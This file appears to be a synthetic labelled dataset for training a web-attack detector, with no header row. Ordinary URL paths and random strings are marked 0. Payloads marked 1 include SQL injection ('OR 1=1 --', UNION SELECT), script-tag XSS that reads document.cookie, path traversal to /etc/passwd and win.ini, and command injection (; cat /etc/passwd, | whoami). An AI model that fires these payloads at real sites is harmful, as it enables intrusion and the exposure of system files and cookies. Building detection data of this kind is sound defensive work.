KZkAGO3zeKj,0
settings,0
/login?session=99240,0
../../../../etc/passwd,1
' OR 9=4 --,1
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
/dashboard?session=39986,0
/blog?session=56033,0
/index?id=6946,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=2391,0
/cart?session=55799,0
<script>var a=824;alert(a)</script>,1
/cart?id=4899,0
/login?id=2621,0
' OR 1=4 --,1
; cat /etc/passwd,1
BtBMlGOM3,0
Hg6zuzXaJ,0
/about?session=25817,0
dashboard,0
' OR 3=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=158;alert(a)</script>,1
/user?session=74588,0
| whoami,1
/profile?id=9735,0
admin' --,1
profile,0
<script>var a=713;alert(a)</script>,1
/index?id=2534,0
bE3l1Z0Msgjq,0
/search?id=8524,0
' OR '1'='1,1
' OR 4=3 --,1
/settings?session=70974,0
' OR 2=6 --,1
/user?session=82137,0
/register?id=7670,0
' OR 7=3 --,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=55074,0
login,0
/settings?session=11506,0
i6lZaGsAM2Ge,0
/dashboard?session=11259,0
/checkout?session=46491,0
/login?id=768,0
admin' --,1
<script>var a=250;alert(a)</script>,1
../../../../etc/passwd,1
TtoFeCvP,0
/checkout?session=40904,0
1' o r '1'='1,1
home,0
contact,0
/profile?id=6180,0
<script>var a=935;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>var a=279;alert(a)</script>,1
K48sxZvbqbxRHY3,0
' OR '1'='1,1
cart,0
/checkout?id=8716,0
/contact?id=5722,0
SCpRXzoWIjR2V,0
/profile?id=2450,0
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
' OR 4=1 --,1
<script>var a=59;alert(a)</script>,1
/about?session=34645,0
javascript:alert(1),1
/profile?id=2177,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
' OR 3=8 --,1
<script>var a=376;alert(a)</script>,1
/user?id=591,0
admin%00' OR 1=1,1
ymUb3dw5,0
/home?id=2542,0
/dashboard?session=18000,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
/search?session=42431,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=7141,0
MkKOPU1OW5VldtJ,0
KQhNa63wqy,0
joNo1qEiTjJuaI,0
/settings?id=7927,0
contact,0
s E l E c T * f R o M a d m i n,1
/dashboard?id=2922,0
' OR 8=9 --,1
/checkout?id=5860,0
<script>var a=346;alert(a)</script>,1
javascript:alert(1),1
admin%00' OR 1=1,1
/contact?id=3573,0
<script>var a=268;alert(a)</script>,1
/home?session=48025,0
javascript:alert(1),1
' OR 3=1 --,1
/dashboard?id=1585,0
' OR 1=1 --,1
../../../windows/win.ini,1
/register?id=1771,0
register,0
admin' --,1
<script>var a=847;alert(a)</script>,1
/settings?id=4994,0
/blog?session=71759,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/blog?session=86596,0
home,0
/settings?id=4606,0
qQ0EKUhKyx9,0
9Pu168cDTd0p,0
XAJ0euvzkPo,0
HVcnXAdiWn,0
YSdLfSN9QaMG,0
user,0
/contact?session=18910,0
<script>var a=406;alert(a)</script>,1
' OR 1=1 --,1
' OR 3=8 --,1
/login?session=10318,0
<script>var a=231;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/blog?session=20092,0
' OR 1=1 --,1
Em9TkbDCNQ,0
checkout,0
../../../windows/win.ini,1
' OR 6=2 --,1
checkout,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 1=6 --,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
/checkout?session=62326,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=31;alert(a)</script>,1
/checkout?session=53219,0
<script>var a=335;alert(a)</script>,1
user,0
search,0
1' o r '1'='1,1
javascript:alert(1),1
/checkout?id=7428,0
profile,0
/login?session=75009,0
../../../../etc/passwd,1
/contact?session=67052,0
' OR 6=9 --,1
/dashboard?session=34414,0
/settings?session=96456,0
' OR '1'='1,1
/blog?id=2088,0
| whoami,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
/contact?id=1674,0
../../../../etc/passwd,1
lBPDYkL0EVA,0
/about?session=21587,0
; cat /etc/passwd,1
| whoami,1
' OR 3=8 --,1
/user?session=52287,0
' OR 3=6 --,1
admin%00' OR 1=1,1
QzsKJX6FWBB7J,0
JlOfQXY02E,0
<script>var a=542;alert(a)</script>,1
admin' --,1
/register?id=2807,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
<script>var a=469;alert(a)</script>,1
blog,0
<script>var a=809;alert(a)</script>,1
about,0
search,0
s E l E c T * f R o M a d m i n,1
QMhJTwhLj,0
admin%00' OR 1=1,1
login,0
/index?session=89383,0
v7KiSEtdsEDNR,0
; cat /etc/passwd,1
/about?session=45112,0
' OR '1'='1,1
| whoami,1
' OR '1'='1,1
CgiP53LQjC,0
admin' --,1
s E l E c T * f R o M a d m i n,1
hTnL9SSV,0
; cat /etc/passwd,1
; cat /etc/passwd,1
QJ3CPP20BEn,0
' OR 4=6 --,1
' OR '1'='1,1
admin' --,1
/blog?id=2731,0
s E l E c T * f R o M a d m i n,1
kmUN7Qym3g,0
../../../windows/win.ini,1
<script>var a=749;alert(a)</script>,1
home,0
l7dqT3motTxAS8,0
<script>var a=274;alert(a)</script>,1
pw8yPY4lElVdpNR,0
VAqa5tmp9b3Bi,0
1' o r '1'='1,1
/settings?session=22606,0
cart,0
/profile?id=8716,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=79691,0
/profile?id=6530,0
search,0
<script>var a=781;alert(a)</script>,1
../../../../etc/passwd,1
register,0
register,0
; cat /etc/passwd,1
1' o r '1'='1,1
' OR 1=1 --,1
user,0
/settings?session=50529,0
s E l E c T * f R o M a d m i n,1
' OR 4=9 --,1
<script>var a=662;alert(a)</script>,1
| whoami,1
iUhwIfo5TKsRS6,0
user,0
/checkout?session=32478,0
<script>var a=487;alert(a)</script>,1
settings,0
55uoWRGh,0
/settings?session=95402,0
' OR 2=7 --,1
about,0
<script>var a=435;alert(a)</script>,1
' OR 1=8 --,1
<script>alert(document.cookie)</script>,1
search,0
IAsjsIfUzsjZ,0
xbTSsZxslemQE3,0
ud4ECMuxWkZyD6,0
muNZczy77P0EL,0
| whoami,1
/dashboard?id=2883,0
osGHqJ0r7uSwNoP,0
/home?session=14087,0
home,0
/login?id=2420,0
<script>var a=458;alert(a)</script>,1
../../../../etc/passwd,1
' OR 8=7 --,1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
/profile?id=5594,0
s E l E c T * f R o M a d m i n,1
/user?id=8134,0
| whoami,1
<script>var a=133;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/cart?session=10609,0
/register?session=37751,0
../../../../etc/passwd,1
/home?id=7365,0
cart,0
javascript:alert(1),1
<script>var a=102;alert(a)</script>,1
p6NQnaZV3,0
<script>var a=961;alert(a)</script>,1
<script>var a=910;alert(a)</script>,1
/blog?session=15625,0
HkRVhFVB34,0
' OR 2=2 --,1
GrV4QsHkoIv2E,0
/about?id=9526,0
| whoami,1
kOpQV1MkfxVKs,0
/index?session=42879,0
0c6aFz0uNB9fx,0
' OR 1=1 --,1
admin' --,1
1' o r '1'='1,1
| whoami,1
profile,0
' OR 7=2 --,1
k7g4vpGvtjvU,0
LqLHNxDSJpYJ9,0
/register?session=39567,0
about,0
admin%00' OR 1=1,1
home,0
/user?session=57797,0
; cat /etc/passwd,1
' OR 6=5 --,1
/about?id=8798,0
/blog?session=91669,0
' OR 1=1 --,1
/about?id=3328,0
| whoami,1
/dashboard?id=9125,0
' OR 1=1 --,1
/cart?id=6547,0
index,0
/settings?session=44580,0
/home?session=56551,0
/home?session=62507,0
javascript:alert(1),1
<script>var a=685;alert(a)</script>,1
settings,0
' OR 8=5 --,1
login,0
/home?id=8277,0
/profile?id=1920,0
/about?session=98565,0
/user?session=17957,0
6DUPVOmYLZBh,0
| whoami,1
../../../../etc/passwd,1
/profile?session=53549,0
| whoami,1
admin' --,1
4p92Eufb0fsGNz,0
/about?id=7056,0
/contact?session=60352,0
dashboard,0
<script>var a=888;alert(a)</script>,1
' OR 5=9 --,1
' OR 3=9 --,1
NFFhKevtQcCw,0
' OR 9=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?session=92278,0
/blog?id=3244,0
../../../../etc/passwd,1
ouCwPS40GHf,0
search,0
; cat /etc/passwd,1
' OR '1'='1,1
/about?id=3605,0
admin%00' OR 1=1,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
BXIeTinLFELjhk,0
<script>var a=793;alert(a)</script>,1
admin%00' OR 1=1,1
yLVaS9BUK0ht,0
w0oQMep6,0
admin' --,1
/dashboard?id=5077,0
index,0
En3NmheClHdaF,0
search,0
onerror=alert(1),1
<script>var a=168;alert(a)</script>,1
' OR 7=3 --,1
<script>var a=95;alert(a)</script>,1
qjyhz22VRPk08s,0
javascript:alert(1),1
register,0
../../../windows/win.ini,1
<script>var a=919;alert(a)</script>,1
<script>var a=869;alert(a)</script>,1
/dashboard?id=9539,0
<script>alert(document.cookie)</script>,1
login,0
' OR 8=2 --,1
/cart?id=3457,0
' OR 6=9 --,1
/register?session=49889,0
Nco0aa2G,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=58341,0
s E l E c T * f R o M a d m i n,1
' OR 8=5 --,1
checkout,0
javascript:alert(1),1
profile,0
| whoami,1
javascript:alert(1),1
/contact?id=3375,0
' OR 7=8 --,1
/blog?session=96675,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
search,0
<script>var a=8;alert(a)</script>,1
onerror=alert(1),1
blog,0
<script>var a=955;alert(a)</script>,1
QY3iy38Fe,0
zOSjnHcbQ1yZw,0
' OR 8=4 --,1
admin' --,1
onerror=alert(1),1
ISRaOP1x,0
onerror=alert(1),1
admin' --,1
/contact?session=80068,0
/login?id=955,0
' OR 9=3 --,1
| whoami,1
admin' --,1
| whoami,1
/cart?id=2679,0
admin' --,1
EOms4LbW3,0
<script>var a=471;alert(a)</script>,1
ghJXEhtTcR,0
/search?id=2646,0
settings,0
<script>var a=298;alert(a)</script>,1
admin' --,1
; cat /etc/passwd,1
| whoami,1
/profile?id=4041,0
qGcq9xwSacn6IEf,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
SMehoMTaiW0fgn7,0
1' o r '1'='1,1
zSC9syHo,0
/search?session=82586,0
/home?id=6354,0
1' o r '1'='1,1
/blog?id=5370,0
admin'/* bypass */OR 1=1,1
<script>var a=57;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
/search?session=36219,0
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 4=4 --,1
' OR 8=3 --,1
/contact?session=55548,0
login,0
| whoami,1
<script>var a=684;alert(a)</script>,1
/dashboard?id=9919,0
user,0
<script>var a=262;alert(a)</script>,1
1' o r '1'='1,1
../../../windows/win.ini,1
' OR 3=4 --,1
<script>var a=229;alert(a)</script>,1
' OR 5=6 --,1
<script>var a=231;alert(a)</script>,1
checkout,0
/user?id=9928,0
C0MUIlhA4J98y1D,0
admin'/* bypass */OR 1=1,1
<script>var a=567;alert(a)</script>,1
/blog?id=2906,0
/settings?id=4264,0
/login?session=92153,0
/register?session=94811,0
/home?id=4237,0
<script>var a=254;alert(a)</script>,1
home,0
admin'/* bypass */OR 1=1,1
| whoami,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
/cart?id=7922,0
/cart?session=22040,0
| whoami,1
contact,0
5VVjNmxbA,0
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=42896,0
' OR 1=1 --,1
<script>var a=829;alert(a)</script>,1
javascript:alert(1),1
/search?id=8007,0
1' o r '1'='1,1
/about?id=3547,0
PzESvOdELCS3CGu,0
' OR 4=8 --,1
' OR 5=1 --,1
../../../../etc/passwd,1
profile,0
<script>var a=830;alert(a)</script>,1
admin' --,1
<script>var a=901;alert(a)</script>,1
blog,0
/login?id=7801,0
profile,0
/checkout?session=20486,0
' OR '1'='1,1
' OR '1'='1,1
admin%00' OR 1=1,1
javascript:alert(1),1
/dashboard?session=37414,0
search,0
oDPkTwPSeSWyi,0
contact,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=81100,0
' OR 5=3 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=49452,0
../../../../etc/passwd,1
index,0
<script>var a=362;alert(a)</script>,1
<script>var a=977;alert(a)</script>,1
/checkout?session=45145,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
search,0
' OR 2=3 --,1
/profile?session=84809,0
s E l E c T * f R o M a d m i n,1
<script>var a=343;alert(a)</script>,1
' OR 5=5 --,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=10816,0
about,0
' OR '1'='1,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
<script>var a=241;alert(a)</script>,1
<script>var a=666;alert(a)</script>,1
G1IBOvLH0W7y0In,0
S9R34Kk557BY,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
' OR 9=7 --,1
; cat /etc/passwd,1
/search?session=81313,0
zRYEtxIa,0
<script>alert(document.cookie)</script>,1
<script>var a=871;alert(a)</script>,1
/user?id=7530,0
search,0
lHU0FiWZna9t,0
/blog?session=79175,0
' OR 1=1 --,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
cart,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
<script>var a=502;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/blog?id=5690,0
' OR '1'='1,1
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
index,0
admin%00' OR 1=1,1
ZIKdMNM6h,0
/search?id=1103,0
/dashboard?session=39464,0
user,0
' OR '1'='1,1
../../../../etc/passwd,1
about,0
s E l E c T * f R o M a d m i n,1
RHulexa7UnxdVl,0
admin' --,1
/blog?session=73684,0
1' o r '1'='1,1
../../../windows/win.ini,1
<script>var a=980;alert(a)</script>,1
| whoami,1
/search?session=49888,0
s E l E c T * f R o M a d m i n,1
<script>var a=751;alert(a)</script>,1
/about?id=5740,0
okVMDseof6T,0
' OR 3=1 --,1
/settings?id=9499,0
V58Fotyl4U,0
/index?session=31896,0
' OR 7=5 --,1
' OR 1=2 --,1
PHw5aD81W1Z,0
/user?session=23600,0
42GTiMoGq7B,0
/login?session=22762,0
index,0
javascript:alert(1),1
i4gQziLm4a6Vu,0
' OR 2=8 --,1
user,0
' OR 3=6 --,1
/blog?session=54226,0
javascript:alert(1),1
/index?session=75106,0
/login?session=12807,0
<script>var a=337;alert(a)</script>,1
/login?session=66092,0
JVq9OfOuFQQD6,0
' OR 7=1 --,1
<script>var a=268;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=751;alert(a)</script>,1
wyeoKCtajn4d,0
login,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
contact,0
/checkout?session=62340,0
admin' --,1
/cart?id=9934,0
admin%00' OR 1=1,1
FFdN2zwdDAIk,0
/user?session=87428,0
<script>var a=591;alert(a)</script>,1
B1fKq0PPz,0
../../../windows/win.ini,1
/contact?id=224,0
checkout,0
rc7CTt5xXrbWRW,0
' OR 7=7 --,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/about?id=9485,0
admin' --,1
/contact?session=87816,0
' OR 6=9 --,1
home,0
cart,0
<script>var a=167;alert(a)</script>,1
/about?session=90719,0
iskNGe4fz,0
FFMYmafeA6MsV4,0
<script>var a=463;alert(a)</script>,1
drUAyowSamd9Pw,0
rfqxhxxCSx,0
/cart?session=96939,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
<script>var a=495;alert(a)</script>,1
/dashboard?session=55070,0
admin' --,1
settings,0
/profile?session=65065,0
search,0
s E l E c T * f R o M a d m i n,1
/contact?session=98776,0
/home?session=79240,0
admin%00' OR 1=1,1
/profile?session=10126,0
wYAgF9AL,0
' OR '1'='1,1
; cat /etc/passwd,1
cart,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?id=8854,0
blog,0
M2a2s43FVDKKzz,0
ct02DI99VGt,0
CUnXNQ8Yz,0
eBaVVoQSXblek4h,0
/dashboard?session=37536,0
/contact?id=7484,0
/about?id=6363,0
dashboard,0
<script>var a=889;alert(a)</script>,1
/login?id=1394,0
/blog?id=4052,0
bjCyg836PQ,0
<script>var a=974;alert(a)</script>,1
register,0
/home?id=270,0
' OR 5=9 --,1
bRRPC1OIwVps,0
<script>var a=95;alert(a)</script>,1
dashboard,0
Dcrc1Hqfyl,0
' OR 6=2 --,1
<script>var a=284;alert(a)</script>,1
' OR 4=9 --,1
dashboard,0
<script>var a=369;alert(a)</script>,1
RBfXGC7VQISy,0
DP2zq3KMoQJ7,0
<script>var a=524;alert(a)</script>,1
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<script>var a=304;alert(a)</script>,1
dashboard,0
' OR 9=3 --,1
../../../windows/win.ini,1
/index?session=92600,0
' OR '1'='1,1
8taHvzPMmevqGD,0
snSxCFSWVR,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=966;alert(a)</script>,1
' OR 2=3 --,1
/profile?id=9326,0
Q5HbGGsXuRzJZsh,0
register,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=5 --,1
<script>alert(document.cookie)</script>,1
faAuSDAHuGyK,0
<script>var a=708;alert(a)</script>,1
' OR 6=3 --,1
<script>var a=649;alert(a)</script>,1
/index?session=68701,0
<script>var a=446;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/dashboard?session=94755,0
../../../../etc/passwd,1
' OR 8=5 --,1
admin' --,1
../../../windows/win.ini,1
LrRYu4FyTgD2V,0
admin' --,1
q7b49ByZ,0
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=1233,0
<script>var a=365;alert(a)</script>,1
/profile?session=60480,0
admin' --,1
| whoami,1
../../../windows/win.ini,1
<script>var a=782;alert(a)</script>,1
admin' --,1
iswBWfE531DKcH,0
register,0
' OR 2=3 --,1
1' o r '1'='1,1
wAGh2gjbnU,0
JNmkJ2tn,0
<script>var a=43;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=75879,0
' OR 1=1 --,1
' OR 2=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
b0IEnctciks,0
LR4JhEc6sRAz,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=6 --,1
/dashboard?id=2528,0
' OR '1'='1,1
| whoami,1
/index?id=8225,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
<script>var a=329;alert(a)</script>,1
' OR 2=9 --,1
admin%00' OR 1=1,1
/cart?session=23230,0
/blog?session=40092,0
<script>var a=533;alert(a)</script>,1
register,0
/settings?session=16663,0
/cart?session=34067,0
<script>var a=842;alert(a)</script>,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
index,0
<script>var a=391;alert(a)</script>,1
pAed0DMhu8djpr,0
<script>var a=143;alert(a)</script>,1
admin' --,1
<script>var a=669;alert(a)</script>,1
javascript:alert(1),1
contact,0
../../../../etc/passwd,1
register,0
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
| whoami,1
; cat /etc/passwd,1
<script>var a=865;alert(a)</script>,1
/login?id=1717,0
../../../windows/win.ini,1
' OR '1'='1,1
1' o r '1'='1,1
| whoami,1
' OR 1=5 --,1
' OR 5=7 --,1
' OR 8=3 --,1
dashboard,0
search,0
gY5hmTeTfj,0
' OR 2=4 --,1
sWERSEOPrLMRCM,0
/home?id=8150,0
' OR 2=1 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=834;alert(a)</script>,1
| whoami,1
46YbOX07IkWu3,0
/dashboard?id=4036,0
YDXmcjys,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
/blog?id=2215,0
settings,0
/search?id=4892,0
/settings?id=202,0
1' o r '1'='1,1
' OR 8=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=294;alert(a)</script>,1
settings,0
/login?id=7663,0
about,0
<script>var a=308;alert(a)</script>,1
<script>var a=838;alert(a)</script>,1
register,0
/home?id=2,0
cnBvPuKqlX,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?session=95866,0
/user?session=83236,0
javascript:alert(1),1
<script>var a=60;alert(a)</script>,1
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
<script>var a=685;alert(a)</script>,1
feAqGzshvn0Jcf,0
/home?session=26059,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=6 --,1
| whoami,1
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
Trd6wPVjpxh,0
/dashboard?session=23024,0
admin'/* bypass */OR 1=1,1
/dashboard?id=1663,0
settings,0
1' o r '1'='1,1
<script>var a=776;alert(a)</script>,1
login,0
/profile?id=9579,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
' OR 8=8 --,1
/profile?session=21889,0
blog,0
<script>var a=64;alert(a)</script>,1
index,0
<script>var a=446;alert(a)</script>,1
; cat /etc/passwd,1
/dashboard?id=417,0
checkout,0
4JJ2rn18,0
' OR '1'='1,1
' OR 5=3 --,1
/user?session=15633,0
bZJWUuZa4Do,0
/blog?id=2320,0
/dashboard?session=46555,0
../../../windows/win.ini,1
../../../windows/win.ini,1
admin' --,1
/register?id=3854,0
/blog?id=1039,0
dashboard,0
/register?id=4237,0
' OR 7=5 --,1
| whoami,1
/profile?id=4334,0
javascript:alert(1),1
/checkout?id=8241,0
admin'/* bypass */OR 1=1,1
<script>var a=849;alert(a)</script>,1
lpKBSJp0UhP,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=7 --,1
admin'/* bypass */OR 1=1,1
' OR 5=8 --,1
i0WkYRWo2W,0
login,0
/search?id=2727,0
<script>var a=531;alert(a)</script>,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
/profile?id=153,0
onerror=alert(1),1
onerror=alert(1),1
../../../../etc/passwd,1
javascript:alert(1),1
<script>var a=286;alert(a)</script>,1
' OR 4=7 --,1
/profile?session=39205,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
UUePzqwN5,0
/search?id=8394,0
; cat /etc/passwd,1
quHPsd8PVbdLWQR,0
<script>var a=624;alert(a)</script>,1
<script>var a=281;alert(a)</script>,1
/blog?id=1952,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
' OR 5=9 --,1
/search?id=6597,0
' OR 5=5 --,1
onerror=alert(1),1
/index?session=39322,0
; cat /etc/passwd,1
; cat /etc/passwd,1
<script>var a=379;alert(a)</script>,1
onerror=alert(1),1
<script>var a=317;alert(a)</script>,1
onerror=alert(1),1
/profile?session=66648,0
<script>var a=175;alert(a)</script>,1
TEU7WLq0,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
checkout,0
/profile?id=4092,0
TJOfL6GXxFpT,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
xCpKYttbo,0
/blog?id=1195,0
rGDu6FAYGZfRsyr,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
<script>var a=964;alert(a)</script>,1
/checkout?id=911,0
rggdLzBLXn,0
' OR 6=3 --,1
| whoami,1
Yk0PP5lk,0
settings,0
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=9 --,1
| whoami,1
javascript:alert(1),1
/user?session=12014,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=561;alert(a)</script>,1
' OR 2=3 --,1
admin' --,1
<script>var a=55;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=892;alert(a)</script>,1
' OR 4=5 --,1
/profile?session=72447,0
admin' --,1
1' o r '1'='1,1
/home?id=5192,0
/about?id=3206,0
/home?session=89249,0
1' o r '1'='1,1
/checkout?id=1868,0
/index?session=58481,0
uRbkddDJ,0
<script>var a=269;alert(a)</script>,1
' OR 1=8 --,1
/register?session=84678,0
/search?id=9234,0
<script>var a=843;alert(a)</script>,1
register,0
/checkout?id=2428,0
/login?id=1099,0
<script>alert(document.cookie)</script>,1
<script>var a=767;alert(a)</script>,1
' OR 4=6 --,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=40737,0
s E l E c T * f R o M a d m i n,1
/dashboard?session=25381,0
' OR '1'='1,1
<script>var a=368;alert(a)</script>,1
/user?session=73368,0
checkout,0
' OR 1=1 --,1
/cart?session=11038,0
admin%00' OR 1=1,1
' OR 4=6 --,1
' OR 1=1 --,1
<script>var a=119;alert(a)</script>,1
' OR 6=9 --,1
/settings?id=7552,0
javascript:alert(1),1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 7=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=44423,0
/about?session=59625,0
' OR 1=1 --,1
javascript:alert(1),1
onerror=alert(1),1
' OR 3=1 --,1
kBGVkYu9Ox,0
' OR 1=1 --,1
/checkout?id=8212,0
user,0
1' o r '1'='1,1
YT9gh8KzVoO,0
../../../../etc/passwd,1
/cart?session=91956,0
HhSF1lnW,0
FfHTOLHg4rea,0
wIHrlMv0BEL,0
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
XdElleREEi0DJ,0
' OR '1'='1,1
CEoi5dShSywQcK,0
' OR 7=7 --,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=2251,0
IIXmR3Er,0
<script>var a=872;alert(a)</script>,1
/index?id=5348,0
EtVxKJ4IA,0
<script>var a=182;alert(a)</script>,1
FF3IxF031pAP,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=7110,0
<script>var a=222;alert(a)</script>,1
<script>var a=587;alert(a)</script>,1
/register?id=5337,0
/profile?id=96,0
/about?id=8429,0
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?id=8563,0
../../../../etc/passwd,1
kAYMeErn,0
/home?id=4339,0
s E l E c T * f R o M a d m i n,1
/search?session=67739,0
/blog?id=9422,0
onerror=alert(1),1
<script>var a=643;alert(a)</script>,1
../../../../etc/passwd,1
| whoami,1
<script>var a=241;alert(a)</script>,1
/search?session=13658,0
../../../../etc/passwd,1
../../../windows/win.ini,1
/settings?session=52493,0
/search?id=2425,0
' OR 1=4 --,1
cart,0
| whoami,1
baE0syRLlvfylX4,0
/login?session=53637,0
' OR 3=9 --,1
/index?session=65992,0
/user?id=696,0
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?session=72349,0
admin' --,1
<script>var a=548;alert(a)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=2 --,1
' OR 7=4 --,1
/dashboard?id=8776,0
hYxBycJeQ0WWFh,0
/profile?id=4301,0
login,0
home,0
/about?session=93074,0
' OR 4=8 --,1
k2J9NGjDUi5I,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
/blog?id=6736,0
<script>var a=658;alert(a)</script>,1
/checkout?session=51868,0
admin' --,1
' OR 2=6 --,1
' OR 5=8 --,1
/contact?id=4549,0
/checkout?session=71218,0
<script>alert(document.cookie)</script>,1
/about?id=9079,0
/search?id=6114,0
/home?session=15573,0
admin%00' OR 1=1,1
onerror=alert(1),1
checkout,0
/search?session=99772,0
/index?id=4576,0
| whoami,1
s E l E c T * f R o M a d m i n,1
/login?id=7743,0
/blog?id=1456,0
/login?id=1113,0
1' o r '1'='1,1
QekeftbfBrzV,0
/register?session=25751,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=33306,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=96372,0
k6uxPcy2iGkqP,0
/login?session=43311,0
admin'/* bypass */OR 1=1,1
/user?id=6161,0
/about?id=4224,0
7UGP0Ehoctkm,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
jTUlWKhGgJz,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
search,0
' OR 5=5 --,1
/home?id=1900,0
' OR 2=6 --,1
../../../windows/win.ini,1
